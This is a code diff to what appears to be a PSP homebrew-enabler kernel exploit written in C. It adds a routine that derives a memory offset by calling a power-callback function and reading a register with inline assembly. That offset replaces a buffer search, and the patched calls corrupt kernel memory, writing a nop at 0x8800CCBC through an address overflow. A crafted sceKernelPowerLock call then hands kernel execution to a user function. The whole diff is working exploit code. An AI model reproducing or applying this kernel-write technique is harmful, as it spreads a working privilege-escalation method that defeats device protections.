@@ -132,6 +132,21 @@ locate_scevsh(void)
 	return (u32) addr_lo;
 }
 
+u32
+power_offset(void *func)
+{
+	u32 offset;
+	void *(*_scePowerRegisterCallback)(u32, SceUID);
+	SceUID sceuid = sceKernelCreateCallback("hen2", 0, 0);
+
+	_scePowerRegisterCallback = func;
+	_scePowerRegisterCallback(0, sceuid);
+	_scePowerRegisterCallback(0, sceuid);
+	__asm__ volatile ("addiu $v0, $v1, 0;" : "=r"(offset));
+
+	return offset;
+}
+
 
 int
 main(void)
@@ -141,7 +156,7 @@ main(void)
 	pspUtilityHtmlViewerParam param;
 	SceUID sceuid;
 	unsigned int i;
-	u32 scevsh_addr, kernel_entry, entry_addr;
+	u32 scevsh_addr, kernel_entry, entry_addr, offset;
 
 	/* prototype of sceUtility_private_2DC8380C, scePower_driver_CE5D389B */
 	int (*_scePowerUnregisterCallback)(u32);
@@ -168,6 +183,9 @@ main(void)
 	_scePowerUnregisterCallback = (void *) (scevsh_addr - 648U);
 	_scePowerRegisterCallback = (void *) (scevsh_addr - 624U);
 
+	offset = power_offset(_scePowerRegisterCallback);
+	log("offset = 0x%08x\n", offset);
+
 	memset(power_buf, 0, sizeof(power_buf));
 	log("power unregister 0x%08x\n", (unsigned int) power_buf + 0x78000000U);
 	/* 0x78000000 + 0x88000000 will overflow, while addr of power_buf is left */
@@ -175,28 +193,17 @@ main(void)
 	log("power unregister OK\n");
 	ClearCaches();
 
-	for (i = 0; i < sizeof(power_buf) / 4; i++) {
-		if (power_buf[i] == -1)
-			break;
-	}
-
-	if (i == sizeof(power_buf) / 4) {
-		log("can't find -1 in range\n");
-		goto out;
-	}
-
-	log("find -1 at offset 0x%08x\n", i * 4);
-
 	sceuid = sceKernelCreateCallback("hen", 0, 0);
-	log("power register 0x%08x\n", 0xCCB0U - i * 4);
+	log("power register 0x%08x\n", 0xCCB0U - (offset & 0xFFFFF));
 	/* this line stores 0/nop to 0x8800CCBC */
-	_scePowerRegisterCallback((0xCCB0U - i * 4) >> 4, sceuid);
+	_scePowerRegisterCallback((0xCCB0U - (offset & 0xFFFFF)) >> 4, sceuid);
 	log("power register OK\n");
 	ClearCaches();
 
 	kernel_entry = (u32) power_callback;
 	entry_addr = ((u32) &kernel_entry) - 16;
 
+	sceKernelDelayThread(1000000);
 	log("suspend intr\n");
 	i = sceKernelCpuSuspendIntr();
 	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x4234);
@@ -204,7 +211,6 @@ main(void)
 	log("resumed intr\n");
 
 out:
-	sceKernelDelayThread(10000000);
 	sceKernelExitGame();
 	sceKernelExitDeleteThread(0);
 
